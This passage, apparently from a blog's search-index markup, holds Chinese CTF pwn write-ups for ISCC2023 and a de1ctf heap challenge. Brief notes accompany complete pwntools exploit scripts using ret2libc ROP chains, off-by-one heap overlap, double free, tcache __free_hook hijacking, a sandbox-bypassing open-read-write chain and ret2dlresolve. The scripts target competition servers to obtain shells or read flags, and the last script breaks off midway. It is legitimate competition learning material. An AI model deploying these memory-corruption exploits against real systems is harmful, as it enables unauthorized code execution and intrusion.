context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;59.110.164.72&amp;quot;,10000)
# io=process(&amp;quot;./Login&amp;quot;)
elf=ELF(&amp;quot;./Login&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

pop_rdi_ret=0x4008c3

io.recvuntil(b&amp;quot;tip: &amp;quot;)
libc_base=int(io.recv(14),16)-0x3c48e0
print(&amp;quot;libc_base:  &amp;quot;+hex(libc_base))

# gdb.attach(io)
# pause()

sys_addr=libc_base+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=libc_base+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

io.recvuntil(b&amp;quot;username:\n&amp;quot;)
payload=cyclic(0x1c)+p32(0x15CC15CC)
io.send(payload)

io.recvuntil(b&amp;quot;password:\n&amp;quot;)
payload=cyclic(0x28)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
io.sendline(payload)


io.interactive()


# Gadgets information
# ============================================================
# 0x00000000004008bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004008be : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004008c0 : pop r14 ; pop r15 ; ret
# 0x00000000004008c2 : pop r15 ; ret
# 0x00000000004008bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004008bf : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400680 : pop rbp ; ret
# 0x00000000004008c3 : pop rdi ; ret
# 0x00000000004008c1 : pop rsi ; pop r15 ; ret
# 0x00000000004008bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400599 : ret

# Unique gadgets found: 11
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;attachment-13usage_of_pen&#34;&gt;attachment-13：(usage_of_pen)&lt;/h4&gt;
&lt;p&gt;被这道题前面的比较函数恶心道了，得上网查书法知识拼拼音然后用0补齐&lt;br&gt;
剩下的就是ret2libc&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./usage_of_pen&amp;quot;)
io=remote(&amp;quot;59.110.164.72&amp;quot;,10002)
elf=ELF(&amp;quot;./usage_of_pen&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)


leave_ret=0x400942
pop_rdi=0x400c53
func_addr=0x400b0f
read_t1=0x40092B
puts_got=elf.got[b&amp;quot;puts&amp;quot;]
puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;!\n&amp;quot;)
# payload=b&amp;quot;dunbi000&amp;quot;
# payload=payload.ljust(40,b&amp;quot;+&amp;quot;)
# payload+=b&amp;quot;nvfeng00&amp;quot;
# payload=payload.ljust(72,b&amp;quot;+&amp;quot;)
payload=b&amp;quot;dunbi000cuobi000yufeng00dunfeng0cunfeng0nvfeng00yuefeng0anfeng00jiebi000&amp;quot;
io.send(payload)

io.recvuntil(b&amp;quot;space\n&amp;quot;)
payload=cyclic(0x28)+p64(func_addr)
io.send(payload)

payload=cyclic(0x28)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(func_addr)
io.send(payload)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

payload=cyclic(0x28)+p64(pop_rdi)+p64(str_bin_sh)+p64(sys_addr)
io.send(payload)

io.interactive()


# Gadgets information
# ============================================================
# 0x0000000000400942 : leave ; ret
# 0x0000000000400c4c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c4e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c50 : pop r14 ; pop r15 ; ret
# 0x0000000000400c52 : pop r15 ; ret
# 0x0000000000400c4b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c4f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400800 : pop rbp ; ret
# 0x0000000000400c53 : pop rdi ; ret
# 0x0000000000400c51 : pop rsi ; pop r15 ; ret
# 0x0000000000400c4d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004006c1 : ret
# 0x0000000000400a16 : ret 0x1474
# 0x00000000004009b2 : ret 0x8b48

# Unique gadgets found: 14
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;attachment-14-your_character&#34;&gt;attachment-14: (your_character)&lt;/h4&gt;
&lt;p&gt;edit有off by one打堆块重叠，控制堆块最后打one_gadget&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=process(&amp;quot;./your_character&amp;quot;)
elf=ELF(&amp;quot;./your_character&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

# io.recvuntil(b&amp;quot;Your choice :&amp;quot;)
# io.sendline(b&amp;quot;2&amp;quot;)
# io.sendlineafter(b&amp;quot;character: \n&amp;quot;,b&amp;quot;a&amp;quot;)
io.recvuntil(b&amp;quot;Your choice :&amp;quot;)
io.sendline(b&amp;quot;1&amp;quot;)

def add(n,cc):
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Damage of skill : &amp;quot;,str(n))
    io.sendafter(b&amp;quot;introduction of skill:&amp;quot;,cc)
    
def extend(i,n):
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index :&amp;quot;,str(i))
    io.sendlineafter(b&amp;quot;Damage of skill : &amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index :&amp;quot;,str(n))
    io.sendafter(b&amp;quot;introduction of skill : &amp;quot;,cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index :&amp;quot;,str(n))
    
def delete(n):
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;5&amp;quot;)
    io.sendlineafter(b&amp;quot;Index :&amp;quot;,str(n))

gdb.attach(io)
pause()

add(0x80,b&amp;quot;aaa&amp;quot;) #0
add(0x18,b&amp;quot;bbb&amp;quot;) #1
add(0x18,b&amp;quot;ccc&amp;quot;) #2
add(0x18,b&amp;quot;ddd&amp;quot;) #3

edit(1,b&amp;quot;a&amp;quot;*0x18+p64(0x61))
delete(2)

add(0x50,b&amp;quot;www&amp;quot;) #2
edit(2,b&amp;quot;A&amp;quot;*0x8)
show(2)

io.recvuntil(b&amp;quot;A&amp;quot;*0x8)
leak_addr=u64(io.recvline()[:-1].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))


delete(0)

heap_addr=leak_addr-0xf0
edit(2,p64(0)*3+p64(0x21)+p64(0)+p64(heap_addr))
show(2)

libc_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x58-0x3C4B20
print(&amp;quot;libc_addr: &amp;quot;+hex(libc_addr))
one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]
shell=libc_addr+one_gadget[0]

edit(2,b&#39;A&#39;*0xf0+p64(heap_addr+0x10))  


io.interactive()


# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;attachment-32double&#34;&gt;attachment-32：(double)&lt;/h4&gt;
&lt;p&gt;aba double free控制堆块到指定位置然后控制指定位置数据&lt;br&gt;
本题注意布栈细节&lt;br&gt;
&lt;s&gt;f12是个好习惯，最开始没找到/bin/sh字串&lt;/s&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;59.110.164.72&amp;quot;,10021)
# io=process(&amp;quot;./attachment-32&amp;quot;)
elf=ELF(&amp;quot;./attachment-32&amp;quot;)

shell=0x4008f7
pop_rdi_ret=0x400cb3

def add(n,s):
    io.recv()
    io.sendline(b&amp;quot;1&amp;quot;)
    io.recv()
    io.sendline(str(n))
    io.recv()
    io.sendline(str(s))
    
def edit(n,s):
    io.recv()
    io.sendline(b&amp;quot;4&amp;quot;)
    io.recv()
    io.sendline(str(n))
    io.recv()
    io.sendline(s)  
    
def delete(n):
    io.recv()
    io.sendline(b&amp;quot;2&amp;quot;)
    io.recv()
    io.sendline(str(n))
    
def ex():
    io.recv()
    io.sendline(b&amp;quot;5&amp;quot;)
    
add(0,0x68)
add(1,0x68)
add(2,0x10)
delete(1)
delete(0)
delete(1)

add(3,0x68)
edit(3,p64(0x6021d8))

# gdb.attach(io)
# pause()   

add(4,0x68)
add(5,0x68)
add(6,0x68)
edit(6,p64(0x15CC15CC)+p64(0x400cd8)+p64(0)*6+p64(0xCC51CC51)) #/bin/sh
ex()


io.recvuntil(b&amp;quot;reward: &amp;quot;)
leak_addr=int(io.recv(14),16)
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))
leak_addr=leak_addr+0xf0
low=(leak_addr)&amp;amp;0xff-0x8
print(&amp;quot;low: &amp;quot;+hex(low))
high=(leak_addr&amp;amp;0xffff)&amp;gt;&amp;gt;8
print(&amp;quot;high: &amp;quot;+hex(high))


payload=cyclic(0x20)+p8(low)+p8(high)
payload=payload.ljust(0xf0,b&amp;quot;a&amp;quot;)+p64(0x6021f8)+p64(0x4008f7) #system
io.recvuntil(b&amp;quot;say:\n&amp;quot;)
io.send(payload)

io.interactive()


# Gadgets information
# ============================================================
# 0x0000000000400cac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400cae : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400cb0 : pop r14 ; pop r15 ; ret
# 0x0000000000400cb2 : pop r15 ; ret
# 0x0000000000400cab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400caf : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004007f0 : pop rbp ; ret
# 0x0000000000400cb3 : pop rdi ; ret
# 0x0000000000400cb1 : pop rsi ; pop r15 ; ret
# 0x0000000000400cad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004006b1 : ret
# 0x0000000000400c40 : ret 0xfffc

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;attachment-36chef&#34;&gt;attachment-36：(chef)&lt;/h4&gt;
&lt;p&gt;edit存在溢出写，可以off by one构造堆块重叠&lt;br&gt;
然后就是简单的劫持&lt;code&gt;__malloc_hook&lt;/code&gt;打one_gadget&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;59.110.164.72&amp;quot;, 10031)
# io=process(&amp;quot;./chef&amp;quot;)
elf=ELF(&amp;quot;./chef&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def menu():
    io.sendlineafter(b&amp;quot;Your choice:&amp;quot;,b&amp;quot;4&amp;quot;)
    
def show():
    io.sendlineafter(b&amp;quot;Your choice:&amp;quot;,b&amp;quot;1&amp;quot;)
    
def add(n,cc):
    io.sendlineafter(b&amp;quot;Your choice:&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;price of food:&amp;quot;,str(n))
    io.sendafter(b&amp;quot;name of food:&amp;quot;,cc)
    
def edit(n,s,cc):
    io.sendlineafter(b&amp;quot;Your choice:&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;index of food:&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;price of food :&amp;quot;,str(s))
    io.sendafter(b&amp;quot;name of food:&amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;Your choice:&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;index of food:&amp;quot;,str(n))
    
menu()

# gdb.attach(io)
# pause()    

add(0x18,b&amp;quot;aaa&amp;quot;) #0
add(0x40,b&amp;quot;bbb&amp;quot;) #1
add(0x30,b&amp;quot;ccc&amp;quot;) #2
add(0x10,b&amp;quot;eee&amp;quot;) #3

show()
edit(0,0x19,p64(0)*3+p64(0x91))
delete(1)
add(0x40,b&amp;quot;b&amp;quot;*7)
show()

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x68-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]
shell=leak_addr+one_gadget[1]

add(0x60,b&amp;quot;qqq&amp;quot;) #4
add(0x60,b&amp;quot;www&amp;quot;) #5
add(0x60,b&amp;quot;eee&amp;quot;) #6

delete(4)

payload=cyclic(0x10)+p64(0)+p64(0x71)+p64(malloc_hook-0x23)
edit(3,len(payload),payload)
add(0x60,p64(shell))
add(0x60,cyclic(0x13)+p64(shell))

delete(5)

io.sendlineafter(b&amp;quot;Your choice:&amp;quot;,b&amp;quot;2&amp;quot;)
io.sendlineafter(b&amp;quot;price of food:&amp;quot;,b&amp;quot;96&amp;quot;)
# io.sendlineafter(b&amp;quot;name of food:&amp;quot;,b&amp;quot;1&amp;quot;)

io.interactive()
    

# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;attachment-37-trapped&#34;&gt;attachment-37: (Trapped)&lt;/h4&gt;
&lt;p&gt;开启沙盒禁用&lt;code&gt;execve()&lt;/code&gt;，需要构造orw rop链&lt;br&gt;
同时也开启canary保护，可以利用格式化字符串泄露&lt;br&gt;
注意额外构造read在bss段读入&lt;code&gt;&#39;/flag&#39;&lt;/code&gt;字串给orw做参数用&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#傻逼本地开调试输入必出锅
from pwn import*
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./Trapped&amp;quot;)
io=remote(&amp;quot;59.110.164.72&amp;quot;, 10066)
elf=ELF(&amp;quot;./Trapped&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

pop_rdi_ret=0x400a23
pop_rsi_r15=0x400a21

io.recvuntil(b&amp;quot;larger box\n&amp;quot;)
payload=b&amp;quot;aaaa%9$p&amp;quot;
io.send(payload)
io.recvuntil(b&amp;quot;aaaa&amp;quot;)
canary=int(io.recv(18),16)
print(&amp;quot;canary:  &amp;quot;+hex(canary))

io.recvuntil(b&amp;quot;larger box\n&amp;quot;)
payload=b&amp;quot;99&amp;quot;
io.send(payload)
io.recvuntil(b&amp;quot;about\n&amp;quot;)
payload=cyclic(0x28)+p64(canary)+p64(0)+p64(pop_rdi_ret)+p64(elf.got[b&amp;quot;puts&amp;quot;])+p64(elf.plt[b&amp;quot;puts&amp;quot;])+p64(0x400777)
io.send(payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

pop_rdx_ret=0x01b92+leak_addr
pop_rsi_ret=0x202f8+leak_addr
pop3_ret=0x400a1e
bss_addr=0x601100
bss_len=0x1000
para=0x7
open_addr=libc.sym[b&amp;quot;open&amp;quot;]+leak_addr
write_addr=libc.sym[b&amp;quot;write&amp;quot;]+leak_addr
read_addr=libc.sym[b&amp;quot;read&amp;quot;]+leak_addr
mprotect=libc.sym[b&amp;quot;mprotect&amp;quot;]+leak_addr

# gdb.attach(io)
# pause()


io.recvuntil(b&amp;quot;about\n&amp;quot;)
payload=cyclic(0x28)+p64(canary)+p64(0)+p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_ret)+p64(bss_addr)+p64(elf.sym[b&amp;quot;read&amp;quot;])+p64(0x400777)
io.send(payload)
payload=b&amp;quot;/flag&amp;quot;
# payload=payload.ljust(0x100,b&amp;quot;\x00&amp;quot;)
io.send(payload)


io.recvuntil(b&amp;quot;about\n&amp;quot;)
payload=cyclic(0x28)+p64(canary)+p64(0)
#o
payload+=p64(pop_rdi_ret)+p64(bss_addr)+p64(pop_rsi_ret)+p64(0)+p64(open_addr)
#r
payload+=p64(pop_rdi_ret)+p64(3)+p64(pop_rsi_ret)+p64(bss_addr+0x160)+p64(pop_rdx_ret)+p64(0x50)+p64(read_addr)
#w
payload+=p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_ret)+p64(bss_addr+0x160)+p64(pop_rdx_ret)+p64(0x50)+p64(write_addr)
io.send(payload)
io.recv()


io.interactive()


# Gadgets information
# ============================================================
# 0x0000000000400a1c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400a1e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400a20 : pop r14 ; pop r15 ; ret
# 0x0000000000400a22 : pop r15 ; ret
# 0x0000000000400a1b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400a1f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004006f8 : pop rbp ; ret
# 0x0000000000400a23 : pop rdi ; ret
# 0x0000000000400a21 : pop rsi ; pop r15 ; ret
# 0x0000000000400a1d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040060e : ret
# 0x0000000000400682 : ret 0x2009
# 0x0000000000400960 : ret 0x2be
# 0x000000000040062b : jmp 0x400610
# 0x0000000000400775 : jmp 0x400700
# 0x00000000004008f5 : jmp 0x4008f8
# 0x000000000040099d : jmp 0x4009ad
# 0x0000000000400c0b : jmp qword ptr [rbp]
# 0x00000000004008a9 : jmp qword ptr [rsi - 0x39]
# 0x00000000004006f1 : jmp rax

# Unique gadgets found: 13
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;attachment-38忘了叫啥了dlresolve的题&#34;&gt;attachment-38：(忘了叫啥了，dlresolve的题)&lt;/h4&gt;
&lt;p&gt;可以用pwntools的自动化工具打通&lt;br&gt;
&lt;s&gt;佩服手动构造的orz&lt;/s&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;x86&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;59.110.164.72&amp;quot;, 10067)
# io=process(&amp;quot;./attachment-38&amp;quot;)
context.binary=elf=ELF(&amp;quot;./attachment-38&amp;quot;)
rop=ROP(&amp;quot;./attachment-38&amp;quot;)

bss_addr=0x804A01C
leave_ret=0x8048378
pop_ebp_ret=0x80484ab
pop3_ret=0x80484a9

dlresolve=Ret2dlresolvePayload(elf, symbol=&#39;system&#39;, args=[&#39;/bin/sh\x00&#39;])
rop.read(0,dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)


# gdb.attach(io)
# pause()


log.info(rop.dump())
payload=flat({76:rop.chain(),256:dlresolve.payload})
io.send(payload)

# read_plt=elf.plt[b&amp;quot;read&amp;quot;]

# payload=cyclic(0x48)+p32(bss_addr)+p32(read_plt)+p32(pop3_ret)+p32(0)+p32(bss_addr)+p32(0x100)


io.interactive()

# Gadgets information
# ============================================================
# 0x08048378 : leave ; ret
# 0x080484ab : pop ebp ; ret
# 0x080484a8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
# 0x080482c9 : pop ebx ; ret
# 0x080484aa : pop edi ; pop ebp ; ret
# 0x080484a9 : pop esi ; pop edi ; pop ebp ; ret
# 0x080482b2 : ret
# 0x0804838e : ret 0xeac1
# 0x08048568 : ret 0xfffe

# Unique gadgets found: 9
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;attachment-39sims&#34;&gt;attachment-39：(SIMS)&lt;/h4&gt;
&lt;p&gt;UAF的tcachebin attack，劫持&lt;code&gt;__free_hook&lt;/code&gt;打one_gadget&lt;br&gt;
&lt;s&gt;最后多次edit是我找不到chunk下标了，孩子不懂摁着玩的&lt;/s&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;59.110.164.72&amp;quot;,10085)
# io=process(&amp;quot;./SIMS&amp;quot;)
elf=ELF(&amp;quot;./SIMS&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;./libc-2.27.so&amp;quot;)

io.recvuntil(b&amp;quot;password:\n&amp;quot;)
rd=cs.rand()
print(&amp;quot;rd:  &amp;quot;+str(rd))
# for i in range(1,36569646000):
#     if rd^i==0x15cc15cc:
#         ps=i
#         break
#     else:
#         continue
ps=2118602923
print(&amp;quot;ans:  &amp;quot;+hex(ps^rd))
io.sendline(str(ps))

def add(n):
    io.sendlineafter(b&amp;quot;one!\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Stu:\n&amp;quot;,str(n))

def delete(n):
    io.sendlineafter(b&amp;quot;one!\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index:\n&amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;one!\n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index:\n&amp;quot;,str(n))
    io.sendafter(b&amp;quot;Content of Stu:\n&amp;quot;,cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;one!\n&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index:\n&amp;quot;,str(n))
    
# gdb.attach(io)
# pause()

for i in range(8):
    add(0x90)
    edit(i,b&amp;quot;/bin/sh&amp;quot;)
    
add(0x90) #8
edit(8,&amp;quot;/bin/sh&amp;quot;)

for i in range(8):
    delete(i)
    
show(7)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
realloc=leak_addr+libc.sym[b&amp;quot;__libc_realloc&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
one_gadget=[0x4f2a5,0x4f302,0x10a2fc]
shell=leak_addr+one_gadget[1]

# for i in range(0,6):
#     add(0x90)

edit(6,p64(free_hook))
add(0x90) #9  
add(0x90) #10
edit(0,p64(sys_addr)) 
edit(1,p64(sys_addr)) 
edit(2,p64(sys_addr)) 
edit(3,p64(sys_addr)) 
edit(4,p64(sys_addr)) 
edit(5,p64(sys_addr)) 
edit(6,p64(sys_addr)) 
edit(7,p64(sys_addr)) 
# edit(8,p64(sys_addr)) 
# add(0x90) #9
# add(0x90) #10
# add(0x90) #11
delete(8)

io.interactive()

# 0x4f2a5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f302 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a2fc execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">ISCC2023 PWN部分wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/dxpXmj6SV/"" data-c="
          &lt;p&gt;64位edit after free，无show函数，无法正常dump出libc基址&lt;br&gt;
又一道打&lt;code&gt;_IO_2_1_stdout_&lt;/code&gt;泄露libc基址的题目，不过难点在于fake_chunk的构造&lt;br&gt;
edit限制了修改的长度，只有构造fake_chunk来达到溢出写的目的&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# gdb.attach(io)
# pause()

def shh():
    io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,29563)
    # io=process(&amp;quot;./de1ctf_2019_weapon&amp;quot;)
    elf=ELF(&amp;quot;./de1ctf_2019_weapon&amp;quot;)
    libc=ELF(&amp;quot;libc-2.23.so&amp;quot;)

    one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]

    def add(s,n,cc):
        io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; \n&amp;quot;,b&amp;quot;1&amp;quot;)
        io.sendlineafter(b&amp;quot;weapon: &amp;quot;,str(s))
        io.sendlineafter(b&amp;quot;index: &amp;quot;,str(n))
        io.sendafter(b&amp;quot;name:\n&amp;quot;,cc)
        
    def delete(n):
        io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; \n&amp;quot;,b&amp;quot;2&amp;quot;)
        io.sendlineafter(b&amp;quot;idx :&amp;quot;,str(n))
        
    def edit(n,cc):
        io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; \n&amp;quot;,b&amp;quot;3&amp;quot;)
        io.sendlineafter(b&amp;quot;idx: &amp;quot;,str(n))
        io.sendafter(b&amp;quot;content:\n&amp;quot;,cc)
    add(0x60,0,b&amp;quot;aaa&amp;quot;)
    add(0x60,1,b&amp;quot;bbb&amp;quot;)
    add(0x60,2,b&amp;quot;ccc&amp;quot;)
    add(0x10,3,b&amp;quot;ddd&amp;quot;)

    # delete(2)

    delete(1)
    delete(0)

    edit(0,b&amp;quot;\x50&amp;quot;)

    # gdb.attach(io)
    # pause()

    add(0x60,4,p64(0)*9+p64(0x71))
    add(0x60,5,p64(0)*3+p64(0xe1))
    # payload=p64(0)*3+p64(0x91)
    # edit(0,payload)

    delete(1)
    # add(0x60,6,b&amp;quot;qqq&amp;quot;)
    # add(0x10,7,b&amp;quot;ttt&amp;quot;)
    delete(0)
    delete(2)

    edit(2,b&amp;quot;\x70&amp;quot;)

    payload=p64(0)*3+p64(0x71)+b&amp;quot;\xdd\x55&amp;quot;
    edit(5,payload)

    add(0x60,7,b&amp;quot;aaa&amp;quot;)
    add(0x60,8,b&amp;quot;bbb&amp;quot;)

    payload=b&amp;quot;\x00&amp;quot;*0x33+p64(0xfbad1877)+p64(0)*3+b&amp;quot;\x00&amp;quot;
    add(0x60,9,payload)

    leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-192-libc.sym[b&amp;quot;_IO_2_1_stderr_&amp;quot;]   
    print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
    shell=one_gadget[3]+leak_addr
    malloc_hook=libc.sym[b&amp;quot;__malloc_hook&amp;quot;]+leak_addr

    add(0x60,10,b&amp;quot;qqq&amp;quot;)

